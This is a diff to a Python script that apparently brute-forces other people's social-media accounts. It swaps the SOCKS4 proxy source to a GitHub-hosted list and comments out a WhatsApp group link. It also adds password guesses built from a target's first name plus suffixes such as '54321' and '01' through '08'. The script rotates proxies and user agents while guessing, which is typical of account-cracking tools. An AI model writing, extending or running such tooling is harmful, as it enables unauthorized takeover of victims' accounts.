@@ -17,11 +17,11 @@ ualu,ualuh = [],[]
 
 ###----------[ GET PROXY ]----------###
 try:
-	proxylist= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
-	open('socksku.txt','w').write(proxylist)
+	proxylist= requests.get('https://github.com/hilboizz/socks/blob/main/indos4.txt').text
+	open('indos4.txt','w').write(proxylist)
 except Exception as e:
 	baz_anim(f'gagal ster :(')
-proxsi=open('socksku.txt','r').read().splitlines()
+proxsi=open('indos4.txt','r').read().splitlines()
 
 ###----------[ USER AGENT 1 ]----------###
 for agenku in range(10000):
@@ -222,7 +222,7 @@ def menu(id):
 		waktu(1)
 		login_men()
 	os.system('clear')
-	os.system('xdg-open https://chat.whatsapp.com/Bk9n3OYSK0h8yc4oHgHkZN')
+	#os.system('xdg-open https://chat.whatsapp.com/Bk9n3OYSK0h8yc4oHgHkZN')
 	waktu(1)
 	banner()
 	print(f'{xxx}─────────────────────────────')
@@ -535,6 +535,15 @@ def passwrd():
 						pwv.append(frs+'1234')
 						pwv.append(frs+'12345')
 						pwv.append(frs+'123456')
+						pwv.append(frs+'54321')
+						pwv.append(frs+'01')
+						pwv.append(frs+'02')
+						pwv.append(frs+'03')
+						pwv.append(frs+'04')
+						pwv.append(frs+'05')
+						pwv.append(frs+'06')
+						pwv.append(frs+'07')
+						pwv.append(frs+'08')
 				else:
 					if len(frs)<3:
 						pwv.append(nmf)
@@ -545,6 +554,15 @@ def passwrd():
 						pwv.append(frs+'1234')
 						pwv.append(frs+'12345')
 						pwv.append(frs+'123456')
+						pwv.append(frs+'54321')
+						pwv.append(frs+'01')
+						pwv.append(frs+'02')
+						pwv.append(frs+'03')
+						pwv.append(frs+'04')
+						pwv.append(frs+'05')
+						pwv.append(frs+'06')
+						pwv.append(frs+'07')
+						pwv.append(frs+'08')
 				if '><v><' in pwt:
 					for xpwn in pwn:
 						pwv.append(xpwn)
